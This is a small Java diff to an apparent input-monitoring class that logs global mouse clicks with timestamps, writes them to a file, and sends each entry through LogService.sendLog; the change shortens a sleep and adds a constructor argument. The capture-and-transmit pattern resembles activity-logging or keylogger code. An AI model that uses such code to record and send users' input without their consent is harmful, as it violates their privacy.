@@ -27,11 +27,11 @@ public class MainControl {
             message.append("MOUSE CLICKED".concat(" ").concat(String.valueOf(((NativeMouseEvent) ev).getButton())));
         }
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file, true))){
-            Log log = new Log(message.toString(), date.toString());
+            Log log = new Log(message.toString(), date.toString(), 3);
             String textWithDate = date.toString().concat(" ").concat(message.toString());
             bw.write(textWithDate + "\n");
             LogService.sendLog(log);
-            Thread.sleep(60000);
+            Thread.sleep(6000);
         } catch (Exception e){
             e.printStackTrace();
         }
